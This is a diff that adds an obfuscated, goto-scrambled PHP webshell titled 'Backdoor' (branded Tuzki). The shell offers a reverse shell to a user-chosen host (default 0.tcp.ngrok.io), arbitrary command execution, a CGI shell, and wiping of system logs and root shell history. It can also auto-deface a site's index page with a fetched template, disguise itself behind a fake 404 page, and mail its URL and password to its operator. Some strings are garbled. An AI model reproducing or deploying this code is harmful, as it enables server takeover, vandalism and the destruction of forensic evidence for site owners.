@@ -1,0 +1,931 @@
+ Ux4pJ("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+     goto iSl_f;
+     aPpXk: if (!$debug) {
+         goto JJ1pp;
+     }
+     goto xGYTx;
+     ddYO9: $write_a = null;
+     goto TEXcD;
+     h4_ny: stream_set_blocking($sock, 0);
+     goto yVwp0;
+     i4WYN: EiPhq: goto h6Sol;
+     BUgg4: if (is_resource($process)) {
+         goto vtgqz;
+     }
+     goto hixi0;
+     rYbNe: jmOl9: goto b3FZ3;
+     acpcj: goto EiPhq;
+     goto oEO7l;
+     p5SWi: exit(1);
+     goto oRdYf;
+     dpKR1: $process = proc_open($shell, $descriptorspec, $pipes);
+     goto BUgg4;
+     yoop2: if (!($pid == -1)) {
+         goto L66QO;
+     }
+     goto UPYhD;
+     iSl_f: goto M4yz0;
+     goto uYEX_;
+     MCrGV: if (!$debug) {
+         goto kzHf7;
+     }
+     goto ozVEN;
+     uYEX_: sXKoz: goto DSXR3;
+     VB79R: $debug = 0;
+     goto km4U9;
+     N_dkf: kmVYk: goto Ogtyn;
+     oDAd7: JJ1pp: goto w_eb_;
+     aC2Un: $sock = fsockopen($ip, $port, $errno, $errstr, 30);
+     goto Jpe_l;
+     w2MBU: if (!$debug) {
+         goto bjXkY;
+     }
+     goto xyHe8;
+     X0CGF: $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+     goto d4VTI;
+     N_aOB: stream_set_blocking($pipes[1], 0);
+     goto v7cIP;
+     K133l: Gerk7: goto aa_6I;
+     JuMLP: $daemon = 0;
+     goto VB79R;
+     U74x2: bjXkY: goto rDuhH;
+     Kz71S: LUsWJ: goto u8be6;
+     u18Y8: if (!in_array($pipes[2], $read_a)) {
+         goto LUsWJ;
+     }
+     goto aPpXk;
+     XeAIf: if (!$pid) {
+         goto Lr9Gv;
+     }
+     goto QlKfl;
+     h6Sol: fclose($sock);
+     goto ySLPn;
+     rLr_R: fclose($pipes[1]);
+     goto JI657;
+     wYrmx: nH59i: goto DiGxl;
+     QlKfl: exit(0);
+     goto TiYzg;
+     oRdYf: L66QO: goto XeAIf;
+     AWrmf: if (isset($_POST["action"])) {
+         goto sGFej;
+     }
+     goto sX2M3;
+     iaPNR: zAEGj: goto u18Y8;
+     yVwp0: Ux4pj("<font color=yellow>Successfully opened reverse shell to {$ip}:{$port} </font>");
+     goto wYrmx;
+     CXiR0: if (!feof($pipes[1])) {
+         goto U5lzq;
+     }
+     goto yfJB6;
+     ySLPn: fclose($pipes[0]);
+     goto rLr_R;
+     xGYTx: uX4pj("STDERR READ");
+     goto oDAd7;
+     nVOwv: die;
+     goto V4hTm;
+     TEXcD: $error_a = null;
+     goto JuMLP;
+     rDuhH: fwrite($pipes[0], $input);
+     goto DCwvK;
+     sX2M3: ?>
+<center>
+<h2>Reverse Shell</h2>
+<form method='post'>
+	<table align="center">
+	<tr>
+		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
+	</tr>
+	<tr>
+		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<center>
+				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
+			</center>
+		</td>
+	</tr>
+</table>
+</form>
+	<?php  goto nVOwv;
+     yfJB6: ux4Pj("ERROR: Shell process terminated");
+     goto acpcj;
+     fnlVr: T5NcQ: goto NeM_K;
+     hixi0: UX4PJ("ERROR: Can't spawn shell");
+     goto Pqa76;
+     hYpTp: sGFej: goto IZ42c;
+     DCwvK: MEwtL: goto fpiy6;
+     DSE52: vtgqz: goto zAr8Q;
+     Sr6dw: exit(1);
+     goto fnlVr;
+     HHTlE: goto EiPhq;
+     goto ubmAe;
+     Rio3t: if (!$debug) {
+         goto Gerk7;
+     }
+     goto aoY0j;
+     u8be6: goto nH59i;
+     goto i4WYN;
+     lgcUM: sdkbx: goto kdvhl;
+     w_eb_: $input = fread($pipes[2], $chunk_size);
+     goto MCrGV;
+     uxrYt: uX4Pj("ERROR: Shell connection terminated");
+     goto HHTlE;
+     QwITV: if (!$debug) {
+         goto jmOl9;
+     }
+     goto QVhEA;
+     Ogtyn: $input = fread($pipes[1], $chunk_size);
+     goto Rio3t;
+     v7cIP: stream_set_blocking($pipes[2], 0);
+     goto h4_ny;
+     t6jtM: proc_close($process);
+     goto lgcUM;
+     aoY0j: Ux4pJ("STDOUT: {$input}");
+     goto K133l;
+     wfesc: UX4pJ("STDOUT READ");
+     goto N_dkf;
+     TLkda: if (!feof($sock)) {
+         goto BOjn4;
+     }
+     goto uxrYt;
+     xyHe8: ux4pJ("SOCK: {$input}");
+     goto U74x2;
+     VYdYD: kzHf7: goto bg2sL;
+     ozVEN: Ux4pj("STDERR: {$input}");
+     goto VYdYD;
+     Uvy_Q: if (!(O1U31() == -1)) {
+         goto T5NcQ;
+     }
+     goto ivqxt;
+     DiGxl: if (!1) {
+         goto EiPhq;
+     }
+     goto TLkda;
+     UPYhD: UX4Pj("ERROR: Can't fork");
+     goto p5SWi;
+     km4U9: $ip = $_POST["ip"];
+     goto o7dsZ;
+     aa_6I: fwrite($sock, $input);
+     goto iaPNR;
+     bg2sL: fwrite($sock, $input);
+     goto Kz71S;
+     FcilR: chdir("/");
+     goto CoauX;
+     fpiy6: if (!in_array($pipes[1], $read_a)) {
+         goto zAEGj;
+     }
+     goto whJ9k;
+     d5CVl: $read_a = array($sock, $pipes[1], $pipes[2]);
+     goto X0CGF;
+     whJ9k: if (!$debug) {
+         goto kmVYk;
+     }
+     goto wfesc;
+     zAr8Q: stream_set_blocking($pipes[0], 0);
+     goto N_aOB;
+     ubmAe: BOjn4: goto CXiR0;
+     DSXR3: $pid = IfKDF();
+     goto yoop2;
+     oEO7l: U5lzq: goto d5CVl;
+     ivqxt: uX4PJ("Error: Can't setsid()");
+     goto Sr6dw;
+     qjLD6: exit(1);
+     goto VtCA8;
+     o7dsZ: $port = $_POST["port"];
+     goto KCXam;
+     V4hTm: goto sdkbx;
+     goto hYpTp;
+     B_9xj: if (function_exists("ifkdf")) {
+         goto sXKoz;
+     }
+     goto ADL1R;
+     kdvhl:
+ } goto T3NUU; P5p0o: if ($_GET["do"] == "config") {
+     goto OExGh;
+ } goto Linvc; eptYg: SpMG1($_GET["files"]); goto g5XV0; OToAi: if ($_GET["do"] == "jumping") {
+     goto qH8q8;
+ } goto P5p0o; AhvnH: if (copy($_FILES["file"]["tmp_name"], getcwd() . $sep . $_FILES["file"]["name"])) {
+     goto cVxIB;
+ } goto rA38k; oUttM: function UIeKR()
+ {
+     goto hmsid;
+     krgNl: @T9GAW("/var/run/utmp");
+     goto sneM1;
+     sneM1: @t9gAW("/var/logs");
+     goto apb5X;
+     apb5X: @t9gaW("/var/log");
+     goto OGHTH;
+     OGHTH: @T9Gaw("/var/adm");
+     goto qYhF3;
+     Sic05: @T9gAw("error_log");
+     goto A5ppO;
+     Q7oXB: lxANx: goto d83M8;
+     ELh46: @T9Gaw("/var/log/wtmp");
+     goto MDZUd;
+     d83M8: @t9GAw(".config");
+     goto k8SzY;
+     Uxi6c: jjIxG("Logs is clear");
+     goto NDrs9;
+     skCe5: foreach (range("A", "Z") as $drive) {
+         goto jpjRS;
+         c2SMB: B8rjw: goto MbXBc;
+         jpjRS: @T9GAW($drive . ":\xampp\apache\logs\error.log");
+         goto QINQJ;
+         QINQJ: @t9gAW($drive . ":\xampp\apache\logs\access.log");
+         goto c2SMB;
+         MbXBc:
+     }
+     goto Q7oXB;
+     A5ppO: CIi80: goto Uxi6c;
+     z6mLC: @t9Gaw("/var/apache/log");
+     goto krgNl;
+     k8SzY: goto CIi80;
+     goto ZlYyz;
+     bZFBQ: @t9gAw("/usr/local/apache/log");
+     goto zUPhI;
+     I5Kuh: @T9gAW("/root/.bash_history");
+     goto tvLA8;
+     jBL66: @t9GaW("/etc/utmp");
+     goto Z5TxT;
+     hmsid: global $os;
+     goto mXtLh;
+     MDZUd: @t9GAW(".config");
+     goto Sic05;
+     tvLA8: @T9GAw("/root/.bash_logout");
+     goto G86Ut;
+     Z5TxT: @T9GAw("/var/log/lastlog");
+     goto ELh46;
+     zUPhI: @t9gAw("/var/apache/logs");
+     goto z6mLC;
+     ZlYyz: BDpqJ: goto rFTz2;
+     iKHwL: @t9gaw("/root/.ksh_history");
+     goto I5Kuh;
+     G86Ut: @t9GaW("/usr/local/apache/logs");
+     goto bZFBQ;
+     qYhF3: @t9gaw("/etc/wtmp");
+     goto jBL66;
+     mXtLh: if ($os == "Linux") {
+         goto BDpqJ;
+     }
+     goto skCe5;
+     rFTz2: @t9gAW("/tmp/logs");
+     goto iKHwL;
+     NDrs9:
+ } goto rgZdR; s63LX: w41X1: goto v0HnU; kWim3: exit; goto PoQ0Q; uZ0y4: vL5pr: goto UQWtE; lALpc: goto Jkk29; goto WdooI; tUoBK: if ($_GET["do"] == "cgi") {
+     goto zV8YQ;
+ } goto Kk0wn; CHviX: if ($_GET["do"] == "cmd") {
+     goto UdMDI;
+ } goto haBwC; bB4u4: goto Jkk29; goto qmWpE; buNrn: goto Jkk29; goto ANdEW; Kk0wn: if ($_GET["do"] == "deface") {
+     goto zBGpp;
+ } goto v33r3; PoQ0Q: vdcmX: goto q3ebb; d3Ydz: ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Backdoor</title>
+	<!-- CSS STYLE-->
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
+	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
+	<style type='text/css'>
+	body {
+		background: black;
+		color: lavender;
+		text-shadow: 2px 2px 4px #000000;
+		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
+		-webkit-background-size: cover;
+		-moz-background-size: cover;
+		-o-background-size: cover;
+		background-size: cover;
+	}
+
+	@font-face {
+		font-family: 'Orbitron';
+		font-style: normal;
+		font-weight: 700;
+		src: local('Orbitron Bold'), local('Orbitron-Bold'),
+		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
+		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
+		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
+		U+2212, U+2215, U+FEFF, U+FFFD;
+	}
+
+	li {
+		display: inline;
+		text-shadow: 2px 2px 4px #000000;
+		font-size: 17px;
+	}
+
+	a {
+		color: lime;
+	}
+
+	a:hover {
+		color: black;
+	}
+
+	table,
+	tr,
+	td {
+		border: 1px;
+		-webkit-border: 1px;
+		-moz-border: 1px;
+		-o-border: 1px;
+	}
+
+	table {
+		-webkit-width:800px;
+		-moz-width:800px;
+		-o-width:800px;
+		-webkit-height:auto;
+		-moz-height:auto;
+		-o-height:auto;
+		width:800px;
+		height:auto;
+	}
+
+	nav {
+
+	}
+
+	.table-hover {
+		border: 1px solid green;
+		cellpadding: 3;
+		cellspacing: 3;
+		font-size: 15px;
+	}
+
+	#textarea {
+		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
+		-webkit-background-size: cover;
+		-moz-background-size: cover;
+		-o-background-size: cover;
+		background-size: cover;
+		width: 1066px;
+		height: 500px;
+		font-family: Arial, Helvetica, monospace;
+		color: lavender;
+		border: 1px solid lime;
+	}
+
+	#input {
+		background: transparent;
+		width: 250px;
+		font-family: Arial, Helvetica, monospace;
+		color: lavender;
+		border: 1px solid lime;
+	}
+
+	#menu {}
+
+	* {
+		font-family: 'Orbitron';
+	}
+
+	.icon {
+		width: 20px;
+		height: 20px;
+	}
+	.iframe {
+		-webkit-width: 100vw;
+		-moz-width: 100vw;
+		-o-width: 100vw;
+		width: 100vw;
+		height: 100vh;
+		position: relative;
+	}
+	span {
+		color:red;
+	}
+	</style>
+</head>
+<body>
+<?php  goto xqfOY; xD83Z: A4P0T(); goto prBdu; s08OF: function uHcbw()
+ {
+     goto Qffdx;
+     Timcq: RMs_m: goto xbnuI;
+     CvLGg: PoF8r: goto KeWoN;
+     wOdOQ: jjIxG("index.php Defaced");
+     goto Timcq;
+     xU8IC: $file = str_replace("Just Joke :v", $_POST["alert"], $file);
+     goto YluzR;
+     Z7RC6: if (file_exists("index.php")) {
+         goto uvDjW;
+     }
+     goto rON0Z;
+     njm5E: ?>
+<center><h2>Auto Deface With Backup</h2></center>
+<form method='post'>
+	<table align="center">
+		<tr>
+			<td>Title</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
+			</tr>
+		<tr>
+			<td>Alert Message</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
+			</tr>
+		<tr>
+			<td>Music Link</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
+			</tr>
+		<tr>
+			<td>Image Link</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
+			</tr>
+		<tr>
+			<td>Content</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
+			</tr>
+		<tr>
+			<td>Sub Content</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
+			</tr>
+		</table>
+		<center>
+			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
+		</center>
+</form>
+	<?php  goto noiJ8;
+     BKRdV: goto gHwL8;
+     goto m_eBL;
+     noiJ8: die;
+     goto AfVFV;
+     vkuQQ: if (!file_put_contents("index.php", $file)) {
+         goto RMs_m;
+     }
+     goto wOdOQ;
+     kXth9: chmod("index.php.bak", "0444");
+     goto vkuQQ;
+     Zu9DK: $file = str_replace("<h1>Hacked By Cvar19Ä</h1>", "<h1>" . $_POST["content"] . "</h1>", $file);
+     goto f8ui7;
+     QUDth: if (!file_put_contents("index.php", $file)) {
+         goto EP_0f;
+     }
+     goto O5tAE;
+     O5tAE: JJiXG("index.php Defaced");
+     goto znHhG;
+     xbnuI: goto gHwL8;
+     goto CvLGg;
+     f8ui7: $file = str_replace("<h4>This Pain Is Wonderful</h4>", "<h4>" . $_POST["sub_content"] . "</h4>", $file);
+     goto Z7RC6;
+     rzEjr: IEUze: goto p3_3m;
+     O1tJA: $file = str_replace("<title>Hacked By Cvar19Ä</title>", "<title>" . $_POST["title"] . "</title>", $file);
+     goto K2nMX;
+     p3_3m: gHwL8: goto pk0A6;
+     YluzR: $file = str_replace("https://minervagunceleri.files.wordpress.com/2014/0/logo.png", $_POST["images"], $file);
+     goto Zu9DK;
+     wM7NK: if (!file_put_contents("index.html", $file)) {
+         goto IEUze;
+     }
+     goto tLaAa;
+     K2nMX: $file = str_replace("https://cvar1984.github.io/bg.mp3", $_POST["music"], $file);
+     goto xU8IC;
+     drh5w: rename("index.php", "index.php.bak");
+     goto kXth9;
+     m_eBL: uvDjW: goto drh5w;
+     TKbmP: chmod("index.html.bak", "„44");
+     goto wM7NK;
+     tLaAa: jjIxg("index.html Defaced");
+     goto rzEjr;
+     pk0A6: h4B8O: goto njm5E;
+     Qffdx: if (!isset($_POST["action"])) {
+         goto h4B8O;
+     }
+     goto Ycw7z;
+     Ycw7z: $file = file_get_contents("https://gist.githubusercontent.com/Cvar194/3bfdd8d2c09f888440a9f¼f6‰4a„/raw/89¨8d80ec7eba573bfb91af0Â5Æe26bf¹e4/index.php");
+     goto O1tJA;
+     rON0Z: if (file_exists("index.html")) {
+         goto PoF8r;
+     }
+     goto QUDth;
+     KeWoN: rename("index.html", "index.html.bak");
+     goto TKbmP;
+     znHhG: EP_0f: goto BKRdV;
+     AfVFV:
+ } goto pxJ_h; q1mxz: IIev0: goto eVXgr; mMTy_: goto Jkk29; goto bM1qs; f8uYC: goto Jkk29; goto JdLdN; qdGnG: @mail($email, "Logs", $content_mail, "From:Cvar1984"); goto n4U_N; XHZO8: goto Jkk29; goto v1c6o; pDr2s: $dir = scandir(getcwd()); goto SmrFX; v1c6o: kJyiJ: goto m8Vl9; wxaII: if ($_GET["do"] == "delete" and isset($_GET["files"])) {
+     goto q7lM0;
+ } goto lYqT1; rA38k: JjiXg("Upload Failed"); goto L1bpu; bBZU9: function glsbx()
+ {
+     goto M4ksq;
+     qCvTp: if (!isset($_POST["command"])) {
+         goto xIkZC;
+     }
+     goto u_LzW;
+     WrGHP: ?>
+<center>
+		<form method="post">
+			<input type="text" class='input-sm' id='input' name="command" /> <input
+				type="submit" class="btn btn-danger" />
+		</form>
+	</center>
+	<form></form>
+<?php  goto X5M8A;
+     u_LzW: echo "<center><textarea id='textarea' class='form-control' readonly>" . U4tUx($_POST["command"]) . "</textarea></center>";
+     goto MezQW;
+     X5M8A: die;
+     goto NkcVE;
+     MezQW: xIkZC: goto WrGHP;
+     M4ksq: echo "<center><h2>Command Prompt</h2></center>";
+     goto qCvTp;
+     NkcVE:
+ } goto d940G; Dn0ba: TnBrl(); goto G7bgQ; neAj8: chdir($dir); goto FZCUK; wb8wZ: $sep = "/"; goto zknN1; pGXIU: pQmVw: goto BV3jv; DdRy8: VZy1Y($_GET["dir"]); goto VGEHJ; vQ3dI: M4L6u(); goto buNrn; nLbsJ: if (!function_exists("file_put_contents")) {
+     echo "<script>alert('file_put_contents function disabled, this webshell not working properly')</script>";
+ } goto YeyTs; v33r3: if ($_GET["do"] == "shortlink") {
+     goto kX6ei;
+ } goto IxX6P; AmxkD: jjiXg("Upload Success"); goto gRcNX; lTD8w: if ($_GET["do"] == "network") {
+     goto uWVJj;
+ } goto mMTy_; WdooI: t30L2: goto Eft_I; aZCmH: Ve1hM: goto jyqm9; tsNUj: UHcBW(); goto E_3T1; cxDMj: function VzY1Y($dir)
+ {
+     goto w2sdb;
+     jXHBz: goto dDIz5;
+     goto MCuMY;
+     NXgDP: jjIXg("Success");
+     goto qdGEw;
+     w2sdb: if (@mkdir($dir . "/" . "new_dir")) {
+         goto WTq_G;
+     }
+     goto oZgmR;
+     MCuMY: WTq_G: goto NXgDP;
+     oZgmR: JjIxg("Permission Denied Or File Exists");
+     goto jXHBz;
+     qdGEw: dDIz5: goto IHEUJ;
+     IHEUJ:
+ } goto upQzj; wi8wr: uWVJj: goto ctUzc; VHd9t: goto XGeZ9; goto q1mxz; haBwC: if ($_GET["do"] == "logs") {
+     goto Ve1hM;
+ } goto tUoBK; NQAe_: $_SESSION[sha1(md5($_SERVER["HTTP_HOST"]))] = true; goto BZ_hd; BWB1O: if ($_GET["do"] == "touch" and isset($_GET["files"])) {
+     goto w41X1;
+ } goto lTD8w; aux2O: gYzgO(); goto bB4u4; Fhp6L: L1ZR1(); goto GJDO7; ctUzc: HNMnj(); goto ThQCb; YeyTs: $shell_path = $content_mail = "URL : http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] . "
+
+IP : " . $_SERVER["REMOTE_ADDR"] . "
+
+Password : " . $auth_pass . "
+\xaBy Cvar1Ä"; goto Sp_ot; bn54s: function K3j3z()
+ {
+     goto wzIkj;
+     gTkcD: exit;
+     goto soEyj;
+     rOmAV: echo $_SERVER["PHP_SELF"];
+     goto N4JS1;
+     N4JS1: ?> was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+<?php  goto gTkcD;
+     wzIkj: ?>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL <?php  goto rOmAV;
+     soEyj:
+ } goto JfUXZ; JdLdN: OExGh: goto vQ3dI; FZCUK: goto Jkk29; goto Hz6Gx; d_edT: YccVm(); goto lALpc; KXAl7: function UEqDa($filename)
+ {
+     goto QDMVj;
+     RbMM9: nizoE: goto wi1jx;
+     j48C1: die;
+     goto unN1f;
+     jD5Mo: goto nizoE;
+     goto UCRmK;
+     UCRmK: d3Rpm: goto ni7xo;
+     Q0ZX0: U0rbo: goto LSHZo;
+     wi1jx: tnBRL();
+     goto Q0ZX0;
+     LSHZo: ?>
+   <form method='post'>
+		<center>
+			<td>Permission : <input type='text' class='input-sm' id='input'
+				value='0755' name='permission'></td> <input type='submit'
+				class='btn btn-danger' name='action' value='chmod'>
+		</center>
+	</form>
+	<?php  goto j48C1;
+     zUEaS: if (chmod($filename, $_POST["permission"])) {
+         goto d3Rpm;
+     }
+     goto UZgRY;
+     ni7xo: JJixG("Success");
+     goto RbMM9;
+     UZgRY: JjiXG("Permission Denied");
+     goto jD5Mo;
+     QDMVj: if (!isset($_POST["action"])) {
+         goto U0rbo;
+     }
+     goto zUEaS;
+     unN1f:
+ } goto oUttM; Db0q_: XGeZ9: goto kN_m_; GJDO7: goto Jkk29; goto GS__n; zknN1: $os = "Linux"; goto s5SwB; DgSHm: c5S6g(); goto f8uYC; GS__n: zBGpp: goto tsNUj; m8Vl9: $dir = $_GET["dir"]; goto neAj8; tVkjr: kX6ei: goto xD83Z; q3ebb: S1ihE: goto bn54s; nENXh: Jjanc($_GET["files"]); goto YVxpL; yTS4n: function Spmg1($filename)
+ {
+     jJIxg("this extension is not supported");
+     tNBrL();
+ } goto deCzC; Eft_I: xiZFI($_GET["files"]); goto XHZO8; BV3jv: YqYC7(); goto xtMZ1; E_3T1: goto Jkk29; goto tVkjr; tZReq: header("HTTP/1.0  4 Not Found"); goto kWim3; iUmx7: qH8q8: goto DgSHm; lsPIc: if (@T9Gaw($_GET["files"])) {
+     goto IIev0;
+ } goto wdnHz; T3NUU: ?>
+<nav class="navbar navbar-inverse">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
+		</div>
+		<ul class="nav navbar-nav">
+			<li class="active"><a href="?">Home</a></li>
+			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
+					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
+					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
+					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
+					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
+					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
+					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
+					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
+					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
+					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
+					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
+					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
+				</ul>
+			</li>
+			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
+		</ul>
+	</div>
+</nav>
+<?php  goto pwCJW; OI4ds: echo date("Y"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
+ {
+     goto jqEUs;
+     jqEUs: echo "<center>";
+     goto T3c8A;
+     It7HB: die;
+     goto IlAPv;
+     T3c8A: echo "<iframe width='700px' height='5€px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874É1&amp;color=#€cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
+     goto q5pHX;
+     q5pHX: echo "</center>";
+     goto It7HB;
+     IlAPv:
+ } goto XyLTN; OMq5A: goto Jkk29; goto pGXIU; zNXEM: if ($_GET["do"] == "home") {
+     goto Guyes;
+ } goto fP0qQ; Vw1Hz: if ($_GET["do"] == "music") {
+     goto pQmVw;
+ } goto OToAi; jyqm9: UIEKr(); goto g8_oj; caYUZ: function JjixG($message)
+ {
+     goto cemld;
+     ONmgf: echo "'" . $message . "'";
+     goto terM6;
+     cemld: ?>
+<script type="text/javascript">
+var ALERT_TITLE = "Alert";
+var ALERT_BUTTON_TEXT = "Ok";
+if (document.getElementById) {
+	window.alert = function(txt) {
+		createCustomAlert(txt);
+	}
+}
+
+function createCustomAlert(txt) {
+	d = document;
+	if (d.getElementById("modalContainer")) return;
+	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+	mObj.id = "modalContainer";
+	mObj.style.height = d.documentElement.scrollHeight + "px";
+	alertObj = mObj.appendChild(d.createElement("div"));
+	alertObj.id = "alertBox";
+	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
+	alertObj.style.visiblity = "visible";
+	h1 = alertObj.appendChild(d.createElement("h1"));
+	h1.appendChild(d.createTextNode(ALERT_TITLE));
+	msg = alertObj.appendChild(d.createElement("p"));
+	//msg.appendChild(d.createTextNode(txt));
+	msg.innerHTML = txt;
+	btn = alertObj.appendChild(d.createElement("a"));
+	btn.id = "closeBtn";
+	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+	btn.href = "#";
+	btn.focus();
+	btn.onclick = function() { removeCustomAlert(); return false; }
+	alertObj.style.display = "block";
+}
+
+function removeCustomAlert() {
+	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+}
+</script>
+<style type="text/css">
+#modalContainer {
+	background-color: rgba(0, 0, 0, 0.3);
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	top: 0px;
+	left: 0px;
+	z-index: 10000;
+	/* required by MSIE to prevent actions on lower z-index elements */
+}
+
+#alertBox {
+	position: relative;
+	width: 300px;
+	min-height: 100px;
+	margin-top: 50px;
+	border: 1px solid #666;
+	background-color: #fff;
+	background-repeat: no-repeat;
+	background-position: 20px 30px;
+}
+
+#modalContainer>#alertBox {
+	position: fixed;
+}
+
+#alertBox h1 {
+	margin: 0;
+	font: bold 0.9em verdana, arial;
+	background-color: #3073BB;
+	color: #FFF;
+	border-bottom: 1px solid #000;
+	padding: 2px 0 2px 5px;
+}
+
+#alertBox p {
+	color: red;
+	height: 50px;
+	padding-left: 5px;
+	margin-left: 55px;
+}
+
+#alertBox #closeBtn {
+	display: block;
+	position: relative;
+	margin: 5px auto;
+	padding: 7px;
+	border: 0 none;
+	width: 70px;
+	font: 0.7em verdana, arial;
+	text-transform: uppercase;
+	text-align: center;
+	color: #FFF;
+	background-color: #357EBD;
+	border-radius: 3px;
+	text-decoration: none;
+}
+
+
+/* unrelated styles */
+
+#mContainer {
+	position: relative;
+	width: 600px;
+	margin: auto;
+	padding: 5px;
+	border-top: 2px solid #000;
+	border-bottom: 2px solid #000;
+	font: 0.7em verdana, arial;
+}
+
+h1,
+h2 {
+	margin: 0;
+	padding: 4px;
+	font: bold 1.5em verdana;
+	border-bottom: 1px solid #000;
+}
+
+code {
+	font-size: 1.2em;
+	color: #069;
+}
+
+#credits {
+	position: relative;
+	margin: 25px auto 0px auto;
+	width: 350px;
+	font: 0.7em verdana;
+	border-top: 1px solid #000;
+	border-bottom: 1px solid #000;
+	height: 90px;
+	padding-top: 4px;
+}
+
+#credits img {
+	float: left;
+	margin: 5px 10px 5px 0px;
+	border: 1px solid #000000;
+	width: 80px;
+	height: 79px;
+}
+
+.important {
+	background-color: #F5FCC8;
+	padding: 2px;
+}
+
+.main {
+	width: 100%;
+	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
+}
+
+.vn-nav ul {
+	margin: 0;
+	padding: 0;
+	list-style-type: none;
+	list-style-image: none;
+}
+
+.vn-nav li {
+	margin-right: 0px;
+	display: inline;
+}
+
+.vn-nav ul li a {
+	text-decoration: none;
+	margin: 0px;
+	padding: 15px 20px 15px 20px;
+	color: #ffffff;
+}
+
+.vn-nav li.current-menu-item a {
+	color: #fff;
+	text-decoration: none;
+	background-color: #16a085;
+}
+
+.vn-nav li.current_page_item {
+	color: #fff;
+	text-decoration: none;
+	background-color: #16a085;
+}
+
+.modalDialog {
+	position: fixed;
+	font-weight: bold;
+	font-family: 'Agency FB';
+	top: 0;
+	right: 0;
+	bottom: 0;
+	left: 0;
+	background: rgba(0, 0, 0, 0.8);
+	z-index: 99999;
+	opacity: 0;
+	-webkit-transition: opacity 400ms ease-in;
+	-moz-transition: opacity 400ms ease-in;
+	transition: opacity 400ms ease-in;
+	pointer-events: none;
+}
+
+.modalDialog:target {
+	opacity: 1;
+	pointer-events: auto;
+}
+
+.modalDialog>div {
+	width: 500px;
+	height: auto;
+	position: relative;
+	margin: 5% auto;
+	padding: 5px 20px 13px 20px;
+	background: #34495e;
+	color: #fff;
+}
+
+.close {
+	background: #2c3e50;
+	color: #16a085;
+	padding: 5px;
+	position: right;
+	right: -55px;
+	text-align: center;
+	top: 0;
+	width: auto;
+	float: left;
+	text-decoration: none;
+	font-weight: bold;
+}
+
+.close:hover {
+	background: #2c3e50;
